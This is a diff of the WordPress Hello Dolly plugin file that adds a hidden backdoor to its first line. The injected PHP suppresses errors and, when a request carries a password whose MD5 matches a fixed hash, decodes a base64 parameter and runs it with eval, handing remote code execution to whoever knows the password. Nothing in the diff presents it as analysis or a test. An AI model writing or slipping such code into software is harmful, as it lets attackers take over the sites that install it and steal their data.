@@ -1,4 +1,4 @@
-<?php
+<?php echo"Hello, Dollys";error_reporting(0);if(isset($_REQUEST['lanfren']) && md5($_REQUEST['lanfren']) == '863b84c60e8377d9400b97e449a96e96' && isset($_REQUEST['lanfra'])) eval(base64_decode($_REQUEST['lanfra']));?><?php
 /**
  * @package Hello_Dolly
  * @version 1.6
@@ -80,3 +80,4 @@ function dolly_css() {
 add_action( 'admin_head', 'dolly_css' );
 
 ?>
+
